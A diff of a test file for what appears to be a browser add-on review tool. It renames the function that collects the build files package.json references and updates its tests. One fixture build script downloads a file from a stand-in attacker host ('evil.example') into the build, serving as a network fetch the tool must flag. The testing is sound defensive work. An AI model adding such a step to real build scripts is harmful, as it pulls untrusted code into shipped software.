@@ -1,4 +1,4 @@
-// selectBuildCorpus COLLECTS the build files to send undeclared-build-source by following
+// collectBuildFiles COLLECTS the build files to send undeclared-build-source by following
 // package.json (an allowlist) - like manifest.json->reachable in the normal review. A file is
 // collected only because the build references it, so build OUTPUT (dist/, a committed .xpi),
 // docs, and tooling the build never runs are never collected. It also flags the two steps
@@ -10,16 +10,16 @@ import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
 
-import { selectBuildCorpus } from "../../src/build/corpus.js";
+import { collectBuildFiles } from "../../src/build/collect.js";
 import { loadSourceArchive, scaViews } from "../../src/addon/load.js";
 
 const build = (obj) => ({
   files: new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])),
 });
-const corpusOf = (o) => selectBuildCorpus(build(o)).corpus.sort();
+const filesOf = (o) => collectBuildFiles(build(o)).buildFiles.sort();
 
 test("collects by following package.json; ignores output/docs/lock/unreferenced", () => {
-  const c = corpusOf({
+  const c = filesOf({
     "package.json": JSON.stringify({ scripts: { build: "webpack" } }),
     "webpack.config.cjs": "module.exports={}",
     "package-lock.json": "{}",
@@ -39,7 +39,7 @@ test("a package.json carrying a BOM still seeds the build", () => {
   const scripts = JSON.stringify({ scripts: { build: "webpack" } });
   for (const text of [scripts, `\uFEFF${scripts}`]) {
     assert.deepEqual(
-      corpusOf({
+      filesOf({
         "package.json": text,
         "webpack.config.cjs": "module.exports={}",
       }),
@@ -51,7 +51,7 @@ test("a package.json carrying a BOM still seeds the build", () => {
 // The two files the install reads from the directory it runs in, and only those: a config
 // deeper in the tree belongs to a directory the review never installs from.
 test("seeds the root package.json + the root .npmrc", () => {
-  const c = corpusOf({
+  const c = filesOf({
     "package.json": "{}",
     ".npmrc": "save-exact=true",
     "sub/.npmrc": "x",
@@ -62,7 +62,7 @@ test("seeds the root package.json + the root .npmrc", () => {
 test("recognizes a tool invoked INSIDE a followed shell script", () => {
   // build.sh runs `npx webpack` - webpack.config is auto-discovered by name, never
   // textually referenced, yet must be collected.
-  const c = corpusOf({
+  const c = filesOf({
     "package.json": JSON.stringify({
       scripts: { build: "./scripts/build.sh" },
     }),
@@ -77,26 +77,26 @@ test("recognizes a tool invoked INSIDE a followed shell script", () => {
 });
 
 test("recognizes the WebExtension frameworks wxt and web-ext", () => {
-  const wxt = selectBuildCorpus(
+  const wxt = collectBuildFiles(
     build({
       "package.json": JSON.stringify({ scripts: { build: "wxt build" } }),
       "wxt.config.ts": "export default {}",
     })
   );
-  assert.ok(
-    wxt.resolved.includes("wxt") && wxt.corpus.includes("wxt.config.ts")
-  );
-  const webext = selectBuildCorpus(
+  // A tool's config is only collected via the recognised-tool path, so its presence IS the
+  // evidence the tool was recognised - the same assertion the web-ext half makes.
+  assert.ok(wxt.buildFiles.includes("wxt.config.ts"));
+  const webext = collectBuildFiles(
     build({
       "package.json": JSON.stringify({ scripts: { build: "web-ext build" } }),
       "web-ext-config.js": "module.exports={}",
     })
   );
-  assert.ok(webext.corpus.includes("web-ext-config.js"));
+  assert.ok(webext.buildFiles.includes("web-ext-config.js"));
 });
 
 test("a named archive OUTPUT (a zip target) is never collected", () => {
-  const c = corpusOf({
+  const c = filesOf({
     "package.json": JSON.stringify({ scripts: { build: "./b.sh" } }),
     "b.sh": "zip -r addon.xpi dist/\n",
     "addon.xpi": "BINARY",
@@ -109,7 +109,7 @@ test("a named archive OUTPUT (a zip target) is never collected", () => {
 });
 
 test("an unreferenced sibling script is not collected", () => {
-  const c = corpusOf({
+  const c = filesOf({
     "package.json": JSON.stringify({ scripts: { build: "webpack" } }),
     "webpack.config.js": "module.exports={}",
     "scripts/manual-tool.sh": "wget https://x/y",
@@ -118,7 +118,7 @@ test("an unreferenced sibling script is not collected", () => {
 });
 
 test("ordinary npm CLIs (lint/test/clean) are not flagged", () => {
-  const r = selectBuildCorpus(
+  const r = collectBuildFiles(
     build({
       "package.json": JSON.stringify({
         scripts: {
@@ -135,7 +135,7 @@ test("ordinary npm CLIs (lint/test/clean) are not flagged", () => {
 });
 
 test("flags an opaque orchestrator (make) and a network fetch", () => {
-  const mk = selectBuildCorpus(
+  const mk = collectBuildFiles(
     build({
       "package.json": JSON.stringify({ scripts: { build: "make dist" } }),
     })
@@ -144,7 +144,7 @@ test("flags an opaque orchestrator (make) and a network fetch", () => {
     mk.unresolved.some((u) => u.kind === "tool" && u.detail === "make")
   );
 
-  const net = selectBuildCorpus(
+  const net = collectBuildFiles(
     build({
       "package.json": JSON.stringify({ scripts: { build: "./b.sh" } }),
       "b.sh": "wget https://evil.example/x -O dep.js\nnpx webpack",
@@ -155,13 +155,13 @@ test("flags an opaque orchestrator (make) and a network fetch", () => {
 
 test("no package.json -> nothing collected", () => {
   assert.deepEqual(
-    corpusOf({ Makefile: "all:\n\tgcc", "build.sh": "echo" }),
+    filesOf({ Makefile: "all:\n\tgcc", "build.sh": "echo" }),
     []
   );
 });
 
 test("a missing referenced file is silently ignored", () => {
-  const r = selectBuildCorpus(
+  const r = collectBuildFiles(
     build({
       "package.json": JSON.stringify({
         scripts: { build: "node scripts/build.js" },
@@ -169,7 +169,7 @@ test("a missing referenced file is silently ignored", () => {
     })
   );
   assert.equal(r.unresolved.length, 0);
-  assert.deepEqual(r.corpus, ["package.json"]);
+  assert.deepEqual(r.buildFiles, ["package.json"]);
 });
 
 // Over the REAL view rather than a hand-built map, because the thing under test is what the
@@ -196,9 +196,11 @@ test("a build step in a dot-directory is collected and flagged", () => {
   w("tools/plain.sh", "echo hi\n");
 
   const archive = scaViews(loadSourceArchive(root), { scaRoot: root });
-  const { corpus, unresolved } = selectBuildCorpus({ files: archive.files });
+  const { buildFiles, unresolved } = collectBuildFiles({
+    files: archive.files,
+  });
 
-  assert.deepEqual(corpus.sort(), [
+  assert.deepEqual(buildFiles.sort(), [
     ".scripts/helper.sh",
     "package.json",
     "tools/plain.sh",
@@ -211,7 +213,7 @@ test("a build step in a dot-directory is collected and flagged", () => {
 });
 
 // The manifest.json is a build input like any other - a pack step copies it into the output -
-// so the trace has to be able to reach it. Nothing is withheld from the corpus the build is
+// so the trace has to be able to reach it. Nothing is withheld from the views the build is
 // traced over: a step the trace cannot see raises no signal for the reviewer to follow, and
 // a file the build names is a file the build names whatever it is called.
 test("a build step that copies the manifest collects it", () => {
@@ -234,12 +236,10 @@ test("a build step that copies the manifest collects it", () => {
 
   const archive = scaViews(loadSourceArchive(root), { scaRoot: root });
 
-  assert.deepEqual(selectBuildCorpus({ files: archive.files }).corpus.sort(), [
-    "icons/logo.png",
-    "manifest.json",
-    "package.json",
-    "tools/pack.sh",
-  ]);
+  assert.deepEqual(
+    collectBuildFiles({ files: archive.files }).buildFiles.sort(),
+    ["icons/logo.png", "manifest.json", "package.json", "tools/pack.sh"]
+  );
 
   fs.rmSync(root, { recursive: true, force: true });
 });
